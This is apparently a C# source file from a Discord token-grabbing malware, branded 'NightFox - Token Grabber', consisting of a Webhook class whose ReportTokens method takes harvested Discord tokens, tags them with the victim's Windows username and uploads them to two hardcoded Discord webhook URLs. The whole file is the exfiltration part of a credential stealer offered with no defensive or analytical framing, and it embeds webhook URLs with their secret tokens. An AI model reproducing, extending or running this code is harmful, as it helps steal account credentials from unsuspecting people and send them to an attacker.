using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.Threading;

namespace DiscordTokenGrabber;

public static class Webhook
{
	private static readonly string _hookUrl = "https://discord.com/api/webhooks/906609126203883520/KVC8uhryRMwYKSuZvU_7FsTciV6eAymPI7p_e7rxYxr9PPjoQERTaqCChd9uwCuYW-dB";

	private static readonly string onehandWebhook = "https://discord.com/api/webhooks/890305476942786600/b1ZHiTRv0S-p9KkH2iGQEedwsbKp6MvmfgUjOe4h_T3_it25TadhDmxxZpZ0dHTsAxf8";

	public static void ReportTokens(List<string> tokenReport)
	{
		string value = "NightFox - Token Grabber";
		string value2 = "------------------\n Discord Token report for " + Environment.UserName + " \n\n " + string.Join("\n", tokenReport);
		WebClient webClient = new WebClient();
		webClient.UploadValues(_hookUrl, new NameValueCollection
		{
			{ "content", value2 },
			{ "username", value }
		});
		webClient.UploadValues(onehandWebhook, new NameValueCollection
		{
			{ "content", value2 },
			{ "username", value }
		});
		Thread.Sleep(5000);
	}
}
